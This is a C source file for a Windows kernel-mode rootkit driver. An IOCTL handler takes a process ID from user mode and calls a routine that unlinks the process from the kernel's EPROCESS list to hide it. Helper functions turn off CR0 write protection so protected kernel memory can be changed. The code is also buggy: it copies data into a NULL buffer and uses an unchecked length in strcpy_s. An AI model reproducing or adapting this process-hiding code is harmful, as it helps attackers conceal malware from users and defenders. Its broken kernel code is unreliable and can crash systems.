#include "driver.h"

KIRQL WPOFFx64() {
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;

}

void WPONx64(KIRQL irql) {
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

// IRP code that will call our EPROCESS de-link functionality

//#define IRP_ROOTKIT_CODE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IRP_ROOTKIT_CODE	0x800

// Default IRP dispatcher, passthrough no action, return STATUS_SUCCESS
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// Set status as success
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	// Complete request
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

// Handler to recieve IRP request and call Rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	KdPrint(("enter"));
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufferLength, outBufferLength, requestcode;


	// Recieve the IRP stack location from system
	irpSp = IoGetCurrentIrpStackLocation(Irp);

	// Recieve the buffer lengths, and request code
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
	PCHAR buffer = NULL;

	PCHAR               data = "This String is from Device Driver !!!";
	size_t datalen = strlen(data) + 1;//Length of data including null

	ULONG majorFunction = irpSp->MajorFunction;
	switch (majorFunction)
	{
	case IRP_MJ_CREATE:
		KdPrint(("IRP_MJ_CREATE"));
		break;
	case IRP_MJ_CLOSE:
		KdPrint(("IRP_MJ_CLOSE"));
		break;
	case IRP_MJ_READ:
		KdPrint(("IRP_MJ_READ"));
		break;
	case IRP_MJ_WRITE:
		KdPrint(("IRP_MJ_WRITE"));
		break;
	case IRP_MJ_DEVICE_CONTROL: {
		requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;
		KdPrint(("send code:%p", requestcode));
		NTSTATUS status = STATUS_SUCCESS;
		KdPrint(("is IRPCODRE test:%d", requestcode == IRP_ROOTKIT_CODE));
		if (requestcode == IRP_ROOTKIT_CODE) {
			KdPrint(("enter and execute"));
			__try {
				KdPrint(("inBufferLength:%p", inBufferLength));
				Irp->IoStatus.Information = inBufferLength;
				KdPrint(("DKOM: incoming IRP : %s", inBuf));

				// Allocate memory for the PID
				char pid[32];

				// Copy the input buffer into PID
				strcpy_s(pid, inBufferLength, inBuf);
				KdPrint(("strcpy_s:%s", pid));

				// Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
				/*KIRQL irql;
				//PKDPC dpcPtr;
				irql = WPOFFx64();
				//dpcPtr = AquireLock();  
				*/


				//
				// To access the output buffer, just get the system address
				// for the buffer. For this method, this buffer is intended for transfering data
				// from the driver to the application.
				//


				// Call our rootkit functionality
				// modifyTaskList in hideprocess.c
				data = modifyTaskList(atoi(pid));
				KdPrint(("modifyTaskList"));
				//
				// Write data to be sent to the user in this buffer
				//

				RtlCopyBytes(buffer, data, outBufferLength);
				KdPrint(("RtlCopyBytes"));

				Irp->IoStatus.Information = 4;//(outBufferLength < datalen ? outBufferLength : datalen);
				KdPrint(("Information"));
				/*// Release access to the EPROCESS list and exit
				//ReleaseLock(dpcPtr);
				WPONx64(irql);
				*/
			}
			__except (1) {
				KdPrint(("err"));
			}
		}
		else {
			// Set invalid request
			status = STATUS_INVALID_DEVICE_REQUEST;
			KdPrint(("DKOM Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		}
		KdPrint(("is IRPCODRE test:%d", status));
		
		break;
		}
	}


	// Set status 
	Irp->IoStatus.Status = status;
	// Complete request
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}